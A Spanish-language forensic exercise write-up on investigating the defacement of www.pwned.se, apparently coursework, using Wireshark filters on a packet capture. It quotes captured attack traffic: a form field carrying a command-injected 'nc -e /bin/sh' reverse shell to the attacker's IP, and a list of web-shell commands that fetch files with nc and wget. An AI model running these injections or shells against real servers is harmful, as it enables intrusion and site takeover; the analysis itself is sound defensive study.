# EJERCICIO 1

## El colectivo de hackers FrogSquad desfiguró www.pwned.se el 12 de marzo a las 12:58 UTC.
## Los atacantes subieron una imagen de FrogSquad a: www.pwned.se/skyblue/fr.jpg

## Ejercicio 1.1 y 1.2

## ¿Qué dirección IP utilizaron los atacantes?  
## ¿Cómo consiguió el atacante subir el archivo fr.jpg al servidor web?

1. Buscamos el archivo fr.jpg

2. Analizamos la primera peticion get. ID = 89004. Analizamos IP de destino 217.195.49.146

3. Filtramos por esta IP y por el metodo post

**ip.addr == 217.195.49.146  && http.request.method == "POST"**

4. Analizamos los paquetes que hemos encontrado en busqueda de algo fraudulento.

```plaintext

HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "cid" = "3"
    Form item: "name" = "test" | **nc -e /bin/sh 217.195.49.146** 63122; echo ""
    Form item: "email" = "xx@xx"
    Form item: "subject" = "xx"
    Form item: "message" = "xx"
    Form item: "action" = "Send"
    Form item: "mailinglist" = "1"
    Form item: "cc" = "0"
```

**SOLUCION: La IP atacantes es 217.195.49.146 y han introducido una shell a traves de un formulario.**

## Ejercicio 1.3

## Muestra cómo se veía la página web después del defacement para la URL http://www.pwned.se/skyblue/

1. Para mostrar como se ha quedado la paquina web "Archivo" , "Exportar Objetos" , "HTTP" , Buscamos "fr.jpg"

(Buscamos eso por que sabemos que es la imagen que han introducido en el Ataque)

[IMAGEN](./fr.jpg)

## Ejercicio 1.4 

##  Lista todos los comandos que FrogSquad envió usando la puerta trasera cm0 el 12 de marzo.

1. Buscamos que ha mandado por la puerta trasera cm0

**ip.addr == 217.195.49.146 && http.request.uri contains "cm0"**


```plain
cm0.php?cmd=pwd
/cm0.php?cmd=pwd
/skyblue/cm0.php?cmd=pwd
/skyblue/cm0.php?cmd=cat index.php
/skyblue/cm0.php?cmd=ls
/skyblue/cm0.php?cmd=ls
/skyblue/cm0.php?cmd=nc 217.195.49.146 63129 > fr.html
/skyblue/cm0.php?cmd=ls
/skyblue/cm0.php?cmd=cat fr.html
/skyblue/cm0.php?cmd=nc 217.195.49.146 63129 >FrogSquad.jpg
/skyblue/cm0.php?cmd=ls
/skyblue/cm0.php?cmd=ls -l F*
/skyblue/cm0.php?cmd=nc 217.195.49.146 63129 >FrogSquad.jpg
/skyblue/cm0.php?cmd=ls -l F*
/skyblue/cm0.php?cmd=wget http://217.195.49.146:63129/fr.html
/skyblue/cm0.php?cmd=wget http://217.195.49.146:63129/fr.gif
/skyblue/cm0.php?cmd=ls
/skyblue/cm0.php?cmd=ls -lrt
/skyblue/cm0.php?cmd=wget -?
/skyblue/cm0.php?cmd=wget -? 2>&1
/skyblue/cm0.php?cmd=wge 2>&1
/skyblue/cm0.php?cmd=ls -l F*
/skyblue/cm0.php?cmd=ls -l fr*
/skyblue/cm0.php?cmd=nc -e /bin/sh 217.195.49.146 63122
/skyblue/cm0.php?cmd=ls -l
/skyblue/cm0.php?cmd=ls -la
/skyblue/cm0.php?cmd=ls -la 2>&1
/skyblue/cm0.php?cmd=ls -la
```


